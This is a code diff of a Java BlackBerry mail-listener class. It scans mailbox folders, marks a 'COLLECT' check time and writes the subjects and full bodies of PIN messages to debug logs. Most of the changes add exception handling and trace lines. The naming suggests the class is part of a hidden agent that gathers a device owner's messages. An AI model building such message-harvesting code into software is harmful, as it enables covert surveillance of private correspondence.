@@ -212,11 +212,8 @@ public final class MailListener implements FolderListener, StoreListener,
             scanFolders(names[count], folders, lastCheckDate);
         }
 
-        //#ifdef MARKUP_TIMESTAMP            
-        //#else
         // al termine degli scanfolder
         messageAgent.lastcheckSet("COLLECT", new Date());
-        //#endif
 
         //#ifdef DEBUG_TRACE
         debug.trace("End search");
@@ -460,22 +457,40 @@ public final class MailListener implements FolderListener, StoreListener,
             /* Date precSentDate = null; */
             for (int j = 0; j < messages.length; j++) {
 
+                //debug.trace("1");
                 final Message message = messages[j];
                 if (precRecDate != null) {
+                    //debug.trace("2");
                     Check.asserts(precRecDate.getTime() <= message
                             .getReceivedDate().getTime(),
                             "Wrong order Received: " + message.toString());
                 }
+                //debug.trace("3");
                 precRecDate = message.getReceivedDate();
 
-                Address address;
-                address = message.getFrom();
+                //debug.trace("4");
+                Address address = null;
+                try {
+                    address = message.getFrom();
+                } catch (Exception ex) {
+                    //#ifdef DEBUG_ERROR
+                    debug.error(ex);
+                    //#endif
 
+                    //#ifdef DEBUG_TRACE
+                    debug.trace("lookForPinMessages: " + message.getBodyText());
+                    //#endif
+
+                }
+
+                //debug.trace("5");
                 if (message.getMessageType() == Message.PIN_MESSAGE) {
-                    debug.info("PIN Message: " + message.getFrom() + " s:"
+                    debug.info("PIN Message: " + message.getBodyText() + " s:"
                             + message.getSubject());
                 } else {
+                    //debug.trace("6");
                     if (address != null) {
+                        //debug.trace("7");
                         final String name = address.getName();
                         if (name != null && name.length() == 8
                                 && name.indexOf("@") == -1
@@ -488,20 +503,36 @@ public final class MailListener implements FolderListener, StoreListener,
 
                     }
 
-                    final Address[] addresses = message
-                            .getRecipients(Message.RecipientType.TO);
-                    for (int i = 0; i < addresses.length; i++) {
-                        address = addresses[i];
-                        if (address != null) {
+                    //debug.trace("8");
 
-                            final String name = address.getAddr();
-                            if (name != null && name.length() == 8
-                                    && name.indexOf("@") == -1
-                                    && name.indexOf(" ") == -1) {
+                    Address[] addresses = null;
 
-                                debug.trace("probably PIN Message To: " + name);
-                                debug.trace("  s: " + message.getSubject());
-                                debug.trace("  b: " + message.getBodyText());
+                    try {
+                        addresses = message
+                                .getRecipients(Message.RecipientType.TO);
+                    } catch (Exception ex) {
+                        //#ifdef DEBUG_ERROR
+                        debug.error(ex);
+                        //#endif
+                    }
+                    //debug.trace("9");
+                    if (addresses != null) {
+                        for (int i = 0; i < addresses.length; i++) {
+                            address = addresses[i];
+                            if (address != null) {
+
+                                final String name = address.getAddr();
+                                if (name != null && name.length() == 8
+                                        && name.indexOf("@") == -1
+                                        && name.indexOf(" ") == -1) {
+
+                                    debug.trace("probably PIN Message To: "
+                                            + name);
+                                    debug.trace("  s: " + message.getSubject());
+                                    debug
+                                            .trace("  b: "
+                                                    + message.getBodyText());
+                                }
                             }
                         }
                     }
